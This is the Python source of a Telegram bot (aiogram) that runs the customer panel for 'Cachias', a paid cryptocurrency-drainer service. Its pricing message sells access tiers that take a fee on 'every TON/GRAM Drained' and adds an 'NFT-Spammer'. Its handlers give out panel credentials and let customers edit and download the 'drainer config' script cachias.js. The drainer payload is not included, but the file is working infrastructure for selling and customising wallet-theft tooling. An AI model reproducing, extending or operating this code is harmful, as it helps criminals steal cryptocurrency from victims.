import asyncio
import hashlib
import logging
import math
import os
import tempfile

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from config import BOT_TOKEN, ADMIN_ID, UID_SALT, pe, SUPPORT_URL
from keyboards import kb_main, kb_support, kb_back, kb_admin, kb_admin_back, kb_pricing
from storage import (
    is_allowed, add_user, remove_user_by_cachias_id, list_users,
    claim_key, get_claimed_key, total_keys,
    telegram_id_from_cachias_id, record_seen
)
from js_editor import CONFIG_FIELDS, read_file_content, write_file_content, apply_edit, read_config_from_content
from edit_logger import add_edit_log, get_user_logs

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ── Helper: check if user is admin OR allowed ──────────────
def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def is_authorised(user_id: int) -> bool:
    return is_admin(user_id) or is_allowed(user_id)

# ── FSM States ────────────────────────────────────────────────
class AdminStates(StatesGroup):
    waiting_add_cachias_id = State()
    waiting_add_label      = State()
    waiting_remove_id      = State()

class EditSourceStates(StatesGroup):
    choosing_field = State()
    entering_value = State()
    finalising = State()

# ── Helpers ───────────────────────────────────────────────────
def make_cachias_id(telegram_id: int) -> str:
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    raw   = hashlib.sha256(f"{UID_SALT}{telegram_id}{UID_SALT}".encode()).digest()
    return "".join(chars[b % len(chars)] for b in raw[:9])

def is_valid_cachias_id(s: str) -> bool:
    return len(s) == 9 and s.isalpha()

def track(user_id: int):
    record_seen(make_cachias_id(user_id), user_id)

def fmt_days(days: float) -> str:
    d = math.ceil(days)
    if d >= 30:
        m, r = divmod(d, 30)
        return f"{m} month{'s' if m != 1 else ''}{f' {r}d' if r else ''}"
    return f"{d} day{'s' if d != 1 else ''}"

def denied_msg() -> str:
    return (
        f"{pe('lock')} <b>Access Denied</b>\n\n"
        f"Your ID is not authorised to use this panel.\n"
        f"Check /pricing to see how to get access."
    )

def pricing_msg() -> str:
    return (
        f"{pe('diamond')} <b>Cachias — Get Access</b>\n\n"
        f"{pe('fire')} <b>A-Tier  ·  $500</b>\n"
        f"┌ Full panel access\n"
        f"├ {pe('bolt')} 10% fee on every TON/GRAM Draiined\n"
        f"└ Priority support\n\n"
        f"{pe('crown')} <b>Premium  ·  $2,000</b>\n"
        f"┌ Full panel access\n"
        f"├ {pe('check')} 0% fee — keep everything you Drain\n"
        f"├ {pe('star')} 2 Weeks free usage of NFT-Spammer\n"
        f"└ VIP support\n\n"
        f"{pe('shield')} <b>How to get access</b>\n"
        f"1. Send /id to get your Cachias ID\n"
        f"2. Contact support with your ID + chosen plan\n"
        f"3. Pay in any crypto (BTC, ETH, TON, USDT…)\n"
        f"4. Your ID gets authorised — send /start\n\n"
        f"{pe('bolt')} Tap a plan below to contact support."
    )

def key_msg(entry: dict) -> str:
    return (
        f"{pe('key')} <b>Your Panel Credentials</b>\n\n"
        f"{pe('bolt')} <b>Username</b>\n"
        f"<code>{entry['username']}</code>\n\n"
        f"{pe('shield')} <b>Panel Key</b>\n"
        f"<code>{entry['key']}</code>\n\n"
        f"{pe('check')} Tap either value to copy.\n"
        f"{pe('fire')} Keep these private — do not share."
    )

async def safe_reply(cb: CallbackQuery, text: str, markup):
    try:
        await cb.message.delete()
    except Exception:
        pass
    await bot.send_message(chat_id=cb.message.chat.id, text=text,
                           parse_mode="HTML", reply_markup=markup)

async def set_commands():
    await bot.set_my_commands([
        BotCommand(command="start",   description="Open the main panel"),
        BotCommand(command="help",    description="Show all available commands"),
        BotCommand(command="key",     description="Get your panel credentials"),
        BotCommand(command="id",      description="Get your Cachias ID"),
        BotCommand(command="pricing", description="Plans & how to get access"),
        BotCommand(command="editsource", description="Edit the drainer config file"),
        BotCommand(command="myedits", description="View/download your saved edit logs"),
    ])

# ═══════════════════════════════════════════════════════════════
#  USER HANDLERS
# ═══════════════════════════════════════════════════════════════

@dp.message(CommandStart())
async def cmd_start(msg_: Message):
    uid = msg_.from_user.id
    track(uid)

    if is_admin(uid):
        await msg_.answer(
            f"{pe('crown')} <b>Cachias Admin Panel</b>\n\n"
            f"Welcome back, Admin.\n"
            f"Manage authorised users and key stats below.",
            parse_mode="HTML", reply_markup=kb_admin()
        )
        return

    if not is_allowed(uid):
        await msg_.answer(denied_msg(), parse_mode="HTML", reply_markup=kb_support())
        return

    await msg_.answer(
        f"{pe('star')} <b>Cachias Panel</b>\n\n"
        f"Welcome! Use the button below to get your panel credentials.",
        parse_mode="HTML", reply_markup=kb_main()
    )

@dp.message(Command("help"))
async def cmd_help(msg_: Message):
    uid = msg_.from_user.id
    track(uid)

    if is_admin(uid):
        await msg_.answer(
            f"{pe('list')} <b>Admin Commands</b>\n\n"
            f"{pe('bolt')}  /start   —  Open admin panel\n"
            f"{pe('bolt')}  /admin   —  Admin panel shortcut\n"
            f"{pe('bolt')}  /help    —  Show this menu\n\n"
            f"{pe('crown')} <b>Panel Actions</b>\n\n"
            f"{pe('user')}  Add User    — authorise by Cachias ID\n"
            f"{pe('trash')}  Remove User — revoke by Cachias ID\n"
            f"{pe('list')}  List Users  — all authorised users\n"
            f"{pe('diamond')}  Key Stats   — used / free / total\n\n"
            f"{pe('shield')} Use the buttons below.",
            parse_mode="HTML", reply_markup=kb_admin()
        )
        return

    if not is_allowed(uid):
        await msg_.answer(
            f"{pe('list')} <b>Available Commands</b>\n\n"
            f"{pe('bolt')}  /id       —  Get your Cachias ID\n"
            f"{pe('bolt')}  /pricing  —  Plans & how to get access\n"
            f"{pe('bolt')}  /help     —  Show this list\n\n"
            f"{pe('shield')} See /pricing to get started.",
            parse_mode="HTML", reply_markup=kb_support()
        )
        return

    await msg_.answer(
        f"{pe('list')} <b>Available Commands</b>\n\n"
        f"{pe('bolt')}  /start   —  Open the main panel\n"
        f"{pe('bolt')}  /help    —  Show this list\n"
        f"{pe('bolt')}  /key     —  Get your panel credentials\n"
        f"{pe('bolt')}  /id      —  Get your Cachias ID\n"
        f"{pe('bolt')}  /editsource  —  Edit the drainer config\n"
        f"{pe('bolt')}  /myedits  —  Download saved edit logs\n\n"
        f"{pe('shield')} Tap any command to run it.",
        parse_mode="HTML", reply_markup=kb_main()
    )

@dp.message(Command("key"))
async def cmd_key(msg_: Message):
    uid = msg_.from_user.id
    track(uid)
    if not is_authorised(uid):
        await msg_.answer(denied_msg(), parse_mode="HTML", reply_markup=kb_support())
        return
    await _deliver_key(uid, reply_fn=msg_.answer)

@dp.message(Command("id"))
async def cmd_id(msg_: Message):
    uid = msg_.from_user.id
    track(uid)
    cid = make_cachias_id(uid)
    await msg_.answer(
        f"{pe('bolt')} <b>Your Cachias ID</b>\n\n"
        f"<code>{cid}</code>\n\n"
        f"{pe('shield')} Send this ID to support to request access.",
        parse_mode="HTML"
    )

@dp.message(Command("pricing"))
async def cmd_pricing(msg_: Message):
    uid = msg_.from_user.id
    track(uid)
    if is_authorised(uid) and not is_admin(uid):
        await msg_.answer(
            f"{pe('star')} <b>You already have access!</b>\n\nUse /key to get your panel credentials.",
            parse_mode="HTML", reply_markup=kb_main()
        )
        return
    await msg_.answer(pricing_msg(), parse_mode="HTML", reply_markup=kb_pricing())

@dp.callback_query(F.data == "pricing")
async def cb_pricing(cb: CallbackQuery):
    uid = cb.from_user.id
    track(uid)
    await cb.answer()
    if is_authorised(uid) and not is_admin(uid):
        await safe_reply(cb,
            f"{pe('star')} <b>You already have access!</b>\n\nUse /key to get your panel credentials.",
            kb_main()
        )
        return
    await safe_reply(cb, pricing_msg(), kb_pricing())

@dp.callback_query(F.data == "get_key")
async def cb_get_key(cb: CallbackQuery):
    uid = cb.from_user.id
    track(uid)
    if not is_authorised(uid):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    await _deliver_key(uid, cb=cb)

async def _deliver_key(uid: int, reply_fn=None, cb: CallbackQuery = None):
    async def send(text, markup):
        if cb:
            await safe_reply(cb, text, markup)
        else:
            await reply_fn(text, parse_mode="HTML", reply_markup=markup)

    existing = get_claimed_key(uid)
    if existing:
        await send(key_msg(existing), kb_back() if cb else kb_main())
        return

    entry, days_left = claim_key(uid)

    if days_left is not None:
        await send(
            f"{pe('warn')} <b>Key Cooldown Active</b>\n\n"
            f"You can only claim one key every 3 months.\n\n"
            f"{pe('bolt')} Next key available in: <b>{fmt_days(days_left)}</b>\n\n"
            f"{pe('shield')} Contact support if you need assistance.",
            kb_support()
        )
        return

    if entry is None:
        await send(
            f"{pe('warn')} <b>No Keys Available</b>\n\n"
            f"All panel keys have been distributed.\n"
            f"Contact support for assistance.",
            kb_support()
        )
        return

    log.info(f"Key claimed — user={uid} username={entry['username']}")
    await send(key_msg(entry), kb_back() if cb else kb_main())

@dp.callback_query(F.data == "back_main")
async def cb_back_main(cb: CallbackQuery):
    uid = cb.from_user.id
    track(uid)
    await cb.answer()
    if not is_authorised(uid):
        await safe_reply(cb, denied_msg(), kb_support())
        return
    await safe_reply(cb,
        f"{pe('star')} <b>Cachias Panel</b>\n\n"
        f"Welcome! Use the button below to get your panel credentials.",
        kb_main()
    )

# ═══════════════════════════════════════════════════════════════
#  ADMIN HANDLERS
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("admin"))
async def cmd_admin(msg_: Message):
    if not is_admin(msg_.from_user.id):
        await msg_.answer(denied_msg(), parse_mode="HTML", reply_markup=kb_support())
        return
    await msg_.answer(
        f"{pe('crown')} <b>Admin Panel</b>\n\nChoose an action:",
        parse_mode="HTML", reply_markup=kb_admin()
    )

@dp.callback_query(F.data == "back_admin")
async def cb_back_admin(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await state.clear()
    await cb.answer()
    await safe_reply(cb,
        f"{pe('crown')} <b>Admin Panel</b>\n\nChoose an action:",
        kb_admin()
    )

@dp.callback_query(F.data == "admin_add")
async def cb_admin_add(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    await state.set_state(AdminStates.waiting_add_cachias_id)
    await safe_reply(cb,
        f"{pe('user')} <b>Add User</b>\n\n"
        f"Send the user's <b>Cachias ID</b> (9-letter code) to authorise.\n\n"
        f"{pe('bolt')} The user gets it by sending /id to this bot.\n\n"
        f"<code>Example: aBcXyZqRt</code>",
        kb_admin_back()
    )

@dp.message(AdminStates.waiting_add_cachias_id)
async def fsm_add_cachias_id(msg_: Message, state: FSMContext):
    if not is_admin(msg_.from_user.id): return
    raw = msg_.text.strip()
    if not is_valid_cachias_id(raw):
        await msg_.answer(
            f"{pe('cross')} Invalid Cachias ID — must be exactly 9 letters (a–z, A–Z).\n\n"
            f"Try again or tap Admin Panel to cancel.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )
        return
    tg_id = telegram_id_from_cachias_id(raw)
    if tg_id is None:
        await msg_.answer(
            f"{pe('warn')} <b>Cachias ID Not Found</b>\n\n"
            f"No user with that Cachias ID has opened the bot yet.\n\n"
            f"Ask the user to send /id to this bot first, then retry.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )
        return
    await state.update_data(add_tg_id=tg_id, add_cachias_id=raw)
    await state.set_state(AdminStates.waiting_add_label)
    await msg_.answer(
        f"{pe('user')} ID found! Now send a <b>label</b> for this user\n"
        f"(e.g. their name — for your reference only)\n\n"
        f"Or send <code>-</code> to skip.",
        parse_mode="HTML", reply_markup=kb_admin_back()
    )

@dp.message(AdminStates.waiting_add_label)
async def fsm_add_label(msg_: Message, state: FSMContext):
    if not is_admin(msg_.from_user.id): return
    data       = await state.get_data()
    tg_id      = data["add_tg_id"]
    cachias_id = data["add_cachias_id"]
    label      = msg_.text.strip() if msg_.text.strip() != "-" else ""
    ok         = add_user(tg_id, label, cachias_id)
    await state.clear()
    if ok:
        await msg_.answer(
            f"{pe('check')} <b>User Added</b>\n\n"
            f"{pe('bolt')} Cachias ID: <code>{cachias_id}</code>\n"
            f"{pe('star')} Label: <b>{label or '—'}</b>",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )
        log.info(f"Admin added cachias_id={cachias_id} tg_id={tg_id} label={label}")
    else:
        await msg_.answer(
            f"{pe('warn')} Cachias ID <code>{cachias_id}</code> is already authorised.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )

@dp.callback_query(F.data == "admin_remove")
async def cb_admin_remove(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    await state.set_state(AdminStates.waiting_remove_id)
    await safe_reply(cb,
        f"{pe('trash')} <b>Remove User</b>\n\n"
        f"Send the user's <b>Cachias ID</b> (9-letter code) to revoke access.\n\n"
        f"<code>Example: aBcXyZqRt</code>",
        kb_admin_back()
    )

@dp.message(AdminStates.waiting_remove_id)
async def fsm_remove_id(msg_: Message, state: FSMContext):
    if not is_admin(msg_.from_user.id): return
    raw = msg_.text.strip()
    if not is_valid_cachias_id(raw):
        await msg_.answer(
            f"{pe('cross')} Invalid Cachias ID — must be exactly 9 letters (a–z, A–Z).\n\n"
            f"Try again or tap Admin Panel to cancel.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )
        return
    ok, tg_id = remove_user_by_cachias_id(raw)
    await state.clear()
    if ok:
        await msg_.answer(
            f"{pe('check')} <b>User Removed</b>\n\n"
            f"{pe('bolt')} Cachias ID: <code>{raw}</code> revoked.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )
        log.info(f"Admin removed cachias_id={raw} tg_id={tg_id}")
    else:
        await msg_.answer(
            f"{pe('warn')} Cachias ID <code>{raw}</code> not found in authorised list.",
            parse_mode="HTML", reply_markup=kb_admin_back()
        )

@dp.callback_query(F.data == "admin_list")
async def cb_admin_list(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    users = list_users()
    if not users:
        await safe_reply(cb,
            f"{pe('list')} <b>Authorised Users</b>\n\nNo users added yet.",
            kb_admin_back()
        )
        return
    lines = f"{pe('list')} <b>Authorised Users ({len(users)})</b>\n\n"
    for tg_id, info in users.items():
        label      = info.get("label") or "—"
        cachias_id = info.get("cachias_id") or "—"
        lines += f"{pe('user')} <code>{cachias_id}</code>  ·  {label}\n"
    await safe_reply(cb, lines, kb_admin_back())

@dp.callback_query(F.data == "admin_stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    used, total = total_keys()
    await safe_reply(cb,
        f"{pe('diamond')} <b>Key Statistics</b>\n\n"
        f"{pe('check')}  Used  :  {used}\n"
        f"{pe('bolt')}  Free  :  {total - used}\n"
        f"{pe('star')}  Total :  {total}",
        kb_admin_back()
    )

# ═══════════════════════════════════════════════════════════════
#  EDIT SOURCE CONFIG – IN‑MEMORY EDITS + FINALISATION
# ═══════════════════════════════════════════════════════════════

def get_field_list():
    return list(CONFIG_FIELDS.keys())

async def show_field(chat_id, state, message_id=None, edit=False):
    data = await state.get_data()
    fields = data.get("fields_list", get_field_list())
    idx = data.get("current_index", 0)
    if idx < 0 or idx >= len(fields):
        idx = 0
    key = fields[idx]
    current_content = data.get("current_content", "")
    if not current_content:
        await bot.send_message(chat_id, "⚠️ No content loaded. Use /editsource again.")
        return
    current_values = read_config_from_content(current_content)
    current = current_values.get(key, "not set")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Edit Value", callback_data="edit_value")],
        [
            InlineKeyboardButton(text="◀️ Previous", callback_data="edit_prev"),
            InlineKeyboardButton(text="Next ▶️", callback_data="edit_next"),
        ],
        [InlineKeyboardButton(text="✅ Finish Editing", callback_data="edit_finish")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="edit_cancel")],
    ])

    text = (
        f"📋 <b>Editing Config</b>\n\n"
        f"<b>Field:</b> <code>{key}</code>\n"
        f"<b>Current value:</b>\n<code>{current}</code>\n\n"
        f"({idx+1}/{len(fields)})"
    )
    if edit and message_id:
        await bot.edit_message_text(text, chat_id=chat_id, message_id=message_id,
                                    parse_mode="HTML", reply_markup=keyboard)
    else:
        await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=keyboard)

@dp.message(Command("editsource"))
async def cmd_editsource(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    track(uid)
    if not is_authorised(uid):
        await msg.answer(denied_msg(), parse_mode="HTML", reply_markup=kb_support())
        return

    original = read_file_content()
    if not original:
        await msg.answer("❌ Could not read cachias.js. Check file permissions.")
        return

    fields = get_field_list()
    if not fields:
        await msg.answer("No config fields available.")
        return

    await state.update_data(
        fields_list=fields,
        current_index=0,
        original_content=original,
        current_content=original
    )
    await state.set_state(EditSourceStates.choosing_field)
    await show_field(msg.chat.id, state)

@dp.callback_query(EditSourceStates.choosing_field, F.data.in_({"edit_next", "edit_prev", "edit_value", "edit_finish", "edit_cancel"}))
async def cb_edit_nav(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not is_authorised(uid):
        await cb.answer("Not authorised.", show_alert=True)
        return

    data = await state.get_data()
    fields = data.get("fields_list", get_field_list())
    idx = data.get("current_index", 0)

    if cb.data == "edit_cancel":
        original = data.get("original_content", "")
        if original:
            write_file_content(original)
        await state.clear()
        await cb.message.edit_text("❌ Edit cancelled. Original file restored.")
        await cb.answer()
        return

    if cb.data == "edit_finish":
        await state.set_state(EditSourceStates.finalising)
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬇️ Download edited file", callback_data="edit_download")],
            [InlineKeyboardButton(text="💾 Save as log (download later)", callback_data="edit_save_log")],
            [InlineKeyboardButton(text="❌ Cancel (discard changes)", callback_data="edit_discard")],
        ])
        await cb.message.edit_text(
            "✅ Editing finished.\n\nChoose an option:",
            parse_mode="HTML", reply_markup=keyboard
        )
        await cb.answer()
        return

    if cb.data == "edit_next":
        idx = (idx + 1) % len(fields)
    elif cb.data == "edit_prev":
        idx = (idx - 1) % len(fields)
    elif cb.data == "edit_value":
        await state.update_data(current_index=idx)
        await state.set_state(EditSourceStates.entering_value)
        await cb.message.edit_text(
            f"✏️ Enter the new value for <b>{fields[idx]}</b>:\n"
            f"Send the new value as plain text.\n"
            f"Type <code>cancel</code> to abort.",
            parse_mode="HTML",
            reply_markup=None
        )
        await cb.answer()
        return

    await state.update_data(current_index=idx)
    await show_field(cb.message.chat.id, state, message_id=cb.message.message_id, edit=True)
    await cb.answer()

@dp.message(EditSourceStates.entering_value)
async def fsm_enter_value(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if not is_authorised(uid):
        return

    data = await state.get_data()
    fields = data.get("fields_list", get_field_list())
    idx = data.get("current_index", 0)
    if idx < 0 or idx >= len(fields):
        await state.clear()
        await msg.answer("Session expired. Use /editsource again.")
        return

    key = fields[idx]
    new_value = msg.text.strip()
    if new_value.lower() == "cancel":
        await state.set_state(EditSourceStates.choosing_field)
        await show_field(msg.chat.id, state)
        return

    info = CONFIG_FIELDS.get(key)
    if not info:
        await state.clear()
        await msg.answer("Unknown field. Use /editsource again.")
        return

    try:
        if info["type"] == "float":
            val = float(new_value)
        elif info["type"] == "int":
            val = int(new_value)
        elif info["type"] == "bool":
            if new_value.lower() in ("true", "yes", "1", "on"):
                val = True
            elif new_value.lower() in ("false", "no", "0", "off"):
                val = False
            else:
                raise ValueError("Boolean must be true/false")
        else:
            val = new_value
    except ValueError as e:
        await msg.answer(f"❌ Invalid value: {e}. Please try again or send 'cancel'.")
        return

    current_content = data.get("current_content", "")
    if not current_content:
        await state.clear()
        await msg.answer("No content loaded. Use /editsource again.")
        return
    try:
        new_content = apply_edit(current_content, key, val)
        await state.update_data(current_content=new_content)
        await msg.answer(f"✅ <b>{key}</b> updated to <code>{val}</code>", parse_mode="HTML")
        # Auto‑advance to next field
        idx = (idx + 1) % len(fields)
        await state.update_data(current_index=idx)
        await state.set_state(EditSourceStates.choosing_field)
        await show_field(msg.chat.id, state)
    except Exception as e:
        await msg.answer(f"❌ Failed to apply edit: {e}")
        await state.set_state(EditSourceStates.choosing_field)
        await show_field(msg.chat.id, state)

# ── Finalisation callbacks ────────────────────────────────────
@dp.callback_query(EditSourceStates.finalising, F.data.in_({"edit_download", "edit_save_log", "edit_discard"}))
async def cb_edit_finalise(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not is_authorised(uid):
        await cb.answer("Not authorised.", show_alert=True)
        return

    data = await state.get_data()
    original = data.get("original_content", "")
    current = data.get("current_content", "")
    if not original or not current:
        await cb.message.edit_text("❌ No content found. Please start over.")
        await state.clear()
        await cb.answer()
        return

    if cb.data == "edit_discard":
        write_file_content(original)
        await state.clear()
        await cb.message.edit_text("❌ Changes discarded. Original file restored.")
        await cb.answer()
        return

    if cb.data == "edit_download":
        await cb.message.edit_text("⬇️ Preparing download...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as tf:
            tf.write(current)
            tf_path = tf.name
        await bot.send_document(
            cb.message.chat.id,
            FSInputFile(tf_path, filename="cachias.js"),
            caption="✅ Here is your edited drainer script."
        )
        os.unlink(tf_path)
        write_file_content(original)
        await cb.message.edit_text("✅ File downloaded. Original `cachias.js` has been restored.")
        await state.clear()
        await cb.answer()
        return

    if cb.data == "edit_save_log":
        add_edit_log(uid, current)
        write_file_content(original)
        await cb.message.edit_text("✅ Edited version saved as a log. You can download it later using /myedits.\n\nOriginal `cachias.js` has been restored.")
        await state.clear()
        await cb.answer()
        return

# ── Command to list and download saved logs ──────────────────
@dp.message(Command("myedits"))
async def cmd_myedits(msg: Message):
    uid = msg.from_user.id
    track(uid)
    if not is_authorised(uid):
        await msg.answer(denied_msg(), parse_mode="HTML", reply_markup=kb_support())
        return

    logs = get_user_logs(uid)
    if not logs:
        await msg.answer("You have no saved edit logs.")
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[])
    for i, entry in enumerate(reversed(logs)):
        ts = entry.get("timestamp", "unknown")
        label = f"Edit from {ts[:16]}"
        keyboard.inline_keyboard.append([
            InlineKeyboardButton(text=label, callback_data=f"download_log_{i}")
        ])
    keyboard.inline_keyboard.append([InlineKeyboardButton(text="❌ Close", callback_data="close_logs")])

    await msg.answer("📋 Your saved edit logs:\n\nTap a log to download it.", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("download_log_"))
async def cb_download_log(cb: CallbackQuery):
    uid = cb.from_user.id
    if not is_authorised(uid):
        await cb.answer("Not authorised.", show_alert=True)
        return

    index = int(cb.data.split("_")[-1])
    logs = get_user_logs(uid)
    if index < 0 or index >= len(logs):
        await cb.answer("Log not found.", show_alert=True)
        return
    entry = logs[~index]  # reverse order (since we reversed in display)
    content = entry.get("content", "")
    if not content:
        await cb.answer("Empty log.", show_alert=True)
        return

    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as tf:
        tf.write(content)
        tf_path = tf.name
    await bot.send_document(
        cb.message.chat.id,
        FSInputFile(tf_path, filename=f"cachias_edit_{entry['timestamp'][:10]}.js"),
        caption=f"📄 Edit from {entry['timestamp']}"
    )
    os.unlink(tf_path)
    await cb.answer("File sent.")

@dp.callback_query(F.data == "close_logs")
async def cb_close_logs(cb: CallbackQuery):
    await cb.message.delete()
    await cb.answer()

# ── Button to trigger edit from main menu ────────────────────
@dp.callback_query(F.data == "edit_source")
async def cb_edit_source(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    track(uid)
    if not is_authorised(uid):
        await cb.answer("Not authorised.", show_alert=True)
        return
    await cb.answer()
    await cmd_editsource(cb.message, state)

# ═══════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════

async def main():
    log.info("Cachias Bot starting...")
    await set_commands()
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())